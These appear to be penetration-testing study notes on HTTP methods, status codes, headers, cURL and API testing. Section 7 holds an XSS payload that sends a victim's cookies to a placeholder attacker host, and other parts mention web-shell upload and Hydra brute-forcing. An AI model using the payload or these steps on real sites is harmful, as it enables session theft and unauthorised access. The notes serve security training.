# Web Requests & HTTP Methodology

---

## 1. HTTP Fundamentals

### Request Structure
```
METHOD /path HTTP/1.1
Host: target.com
Header: value
                          ← empty line
body (for POST/PUT)
```

### Response Structure
```
HTTP/1.1 STATUS_CODE Reason
Header: value
                          ← empty line
response body
```

---

## 2. HTTP Methods

| Method | Purpose | Body? | Idempotent? |
|--------|---------|-------|-------------|
| `GET` | Retrieve resource | No | Yes |
| `POST` | Submit data / create resource | Yes | No |
| `PUT` | Update/replace entire resource | Yes | Yes |
| `PATCH` | Partially update resource | Yes | No |
| `DELETE` | Remove resource | Optional | Yes |
| `HEAD` | Same as GET but headers only, no body | No | Yes |
| `OPTIONS` | Show allowed methods | No | Yes |
| `TRACE` | Echo back request (debugging) | No | Yes |

### Key Differences
- **GET**: params in URL → logged, cached, bookmarkable, length-limited (~2000 chars)
- **POST**: params in body → not logged by default, no size limit, binary-safe, less encoding needed
- **PUT vs PATCH**: PUT replaces the entire resource; PATCH modifies specific fields
- **HEAD**: identical to GET but server returns only headers — useful for checking if a resource exists, content type, or size without downloading

---

## 3. Status Codes

| Range | Category | Common Codes |
|-------|----------|--------------|
| 1xx | Informational | 100 Continue |
| 2xx | Success | 200 OK, 201 Created, 204 No Content |
| 3xx | Redirection | 301 Moved Permanently, 302 Found, 304 Not Modified |
| 4xx | Client Error | 400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found, 405 Method Not Allowed |
| 5xx | Server Error | 500 Internal Server Error, 502 Bad Gateway, 503 Service Unavailable |

### OSCP-Relevant Status Codes
- **200** — request succeeded (normal response)
- **301/302** — redirect (follow with `-L` in curl; login success often redirects)
- **401** — authentication required (Basic Auth, API key)
- **403** — forbidden (access control — try different user, path traversal, method override)
- **404** — not found (but sometimes leaks info in error page)
- **405** — method not allowed (try other methods: GET↔POST, PUT, DELETE)
- **500** — server error (possible injection point — the app crashed on your input)

---

## 4. HTTP Headers

### General Headers (both request & response)
| Header | Purpose |
|--------|---------|
| `Date` | Timestamp of the message |
| `Connection` | `keep-alive` or `close` |
| `Cache-Control` | Caching directives |

### Request Headers
| Header | Purpose | Example |
|--------|---------|---------|
| `Host` | Target hostname (required in HTTP/1.1) | `Host: academy.htb` |
| `User-Agent` | Client identifier | `Mozilla/5.0...` |
| `Accept` | Content types client accepts | `text/html, application/json` |
| `Cookie` | Session cookies | `Cookie: PHPSESSID=abc123` |
| `Authorization` | Credentials | `Basic dXNlcjpwYXNz` |
| `Referer` | Previous page URL | `http://target/login` |
| `X-Forwarded-For` | Client IP (behind proxy) | `127.0.0.1` |
| `Content-Type` | Body format | `application/x-www-form-urlencoded` |

### Response Headers
| Header | Purpose |
|--------|---------|
| `Server` | Web server software (fingerprinting) |
| `Set-Cookie` | Set cookie in browser |
| `Location` | Redirect target (with 3xx) |
| `WWW-Authenticate` | Auth scheme (with 401) |
| `X-Powered-By` | Backend technology (fingerprinting) |

### Security Headers
| Header | Purpose | Attack if Missing |
|--------|---------|-------------------|
| `Content-Security-Policy` | Restrict resource loading | XSS |
| `Strict-Transport-Security` | Force HTTPS | MITM/downgrade |
| `X-Frame-Options` | Prevent iframe embedding | Clickjacking |
| `X-Content-Type-Options` | Prevent MIME sniffing | Content injection |
| `X-XSS-Protection` | Browser XSS filter | Reflected XSS |
| `Referrer-Policy` | Control Referer leakage | Info disclosure |
| `Set-Cookie: HttpOnly` | Cookie not accessible via JS | XSS cookie theft |
| `Set-Cookie: Secure` | Cookie only over HTTPS | MITM cookie theft |
| `Set-Cookie: SameSite` | Cookie not sent cross-site | CSRF |

---

## 5. cURL Essentials

### Basic Requests
```bash
# GET request
curl http://TARGET/

# Follow redirects
curl -L http://TARGET/

# Verbose (full request + response)
curl -v http://TARGET/

# Headers only (HEAD request)
curl -I http://TARGET/

# Headers + body
curl -i http://TARGET/

# Silent + just body
curl -s http://TARGET/
```

### POST Requests
```bash
# Form data
curl -X POST http://TARGET/login -d "username=admin&password=pass123"

# JSON
curl -X POST http://TARGET/api/users \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"pass123"}'

# File upload
curl -X POST http://TARGET/upload -F "file=@shell.php"
```

### Authentication
```bash
# Basic Auth (shorthand)
curl -u admin:password http://TARGET/

# Basic Auth (manual header)
curl -H "Authorization: Basic $(echo -n 'admin:password' | base64)" http://TARGET/

# Bearer token
curl -H "Authorization: Bearer eyJhbGci..." http://TARGET/api/

# Cookie auth
curl -b "PHPSESSID=abc123; session=xyz" http://TARGET/dashboard
```

### PUT and DELETE
```bash
# Update resource
curl -X PUT http://TARGET/api/city/london \
  -H "Content-Type: application/json" \
  -d '{"city_name":"New_City","country_name":"HTB"}'

# Delete resource
curl -X DELETE http://TARGET/api/city/New_City
```

### Useful Flags
```bash
-s              # Silent (no progress bar)
-o file.html    # Output to file
-O              # Save with remote filename
-k              # Ignore SSL errors
-x proxy:port   # Use proxy (Burp: -x http://127.0.0.1:8080)
-A "User-Agent" # Custom User-Agent
-H "Header: val" # Custom header (repeatable)
-D headers.txt  # Dump response headers to file
-c cookies.txt  # Save cookies to file
-b cookies.txt  # Send cookies from file
--data-urlencode "param=value with spaces"
```

### Decode Captured Basic Auth
```bash
echo "YWxpY2U6c2VjcmV0MTIz" | base64 -d
# → alice:secret123
```

---

## 6. API Interaction Patterns

### REST API CRUD Operations
```bash
# CREATE (POST)
curl -X POST http://TARGET/api/users \
  -H "Content-Type: application/json" \
  -d '{"name":"test","role":"admin"}'

# READ (GET)
curl -s http://TARGET/api/users | jq
curl -s http://TARGET/api/users/1 | jq

# UPDATE (PUT — full replace)
curl -X PUT http://TARGET/api/users/1 \
  -H "Content-Type: application/json" \
  -d '{"name":"updated","role":"admin"}'

# UPDATE (PATCH — partial)
curl -X PATCH http://TARGET/api/users/1 \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'

# DELETE
curl -X DELETE http://TARGET/api/users/1

# OPTIONS (check allowed methods)
curl -X OPTIONS http://TARGET/api/users -i
```

### Browser Console — fetch() API
```javascript
// POST from browser console
fetch('/api/users', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ name: 'test', role: 'admin' })
}).then(r => r.json()).then(console.log)

// PUT
fetch('/api/users/1', {
  method: 'PUT',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ name: 'updated', role: 'admin' })
}).then(r => r.json()).then(console.log)

// DELETE
fetch('/api/users/1', { method: 'DELETE' }).then(r => r.json()).then(console.log)
```

---

## 7. Cookie & Session Attacks

### Cookie Theft via XSS
```html
<script>new Image().src='http://ATTACKER/?c='+document.cookie</script>
```
- Only works if `HttpOnly` flag is **missing** on the cookie

### Session Replay
- [ ] Capture cookie via XSS, Burp, or network sniff
- [ ] Replace `Cookie:` header in Burp Repeater with stolen value
- [ ] Test session validity

### Session Testing Checklist
- [ ] Does session die on logout?
- [ ] Does session die on password change?
- [ ] Does session die when logging in from different IP?
- [ ] Is `HttpOnly` set? (prevents JS access)
- [ ] Is `Secure` set? (HTTPS only)
- [ ] Is `SameSite` set? (CSRF protection)
- [ ] If none of these → **finding to report**

---

## 8. Decision Tree

```
Web Request Testing
├── Identify technology (Server, X-Powered-By headers)
├── Test all HTTP methods (OPTIONS, PUT, DELETE, PATCH)
│   └── 405? → Try method override: X-HTTP-Method-Override header
├── Check security headers (CSP, HSTS, X-Frame-Options)
│   └── Missing? → XSS, clickjacking, MITM potential
├── API found?
│   ├── Enumerate endpoints (GET /api/, /api/v1/, /api/v2/)
│   ├── Test CRUD without auth
│   ├── Test mass assignment (extra fields in POST/PUT)
│   └── Test IDOR (change IDs: /api/users/1 → /api/users/2)
├── Auth mechanism?
│   ├── Basic Auth → base64 decode, brute with Hydra
│   ├── Cookie-based → check HttpOnly/Secure/SameSite, test replay
│   └── Token-based → check expiration, algorithm, tampering (JWT)
└── Proxy everything through Burp for deeper inspection
```
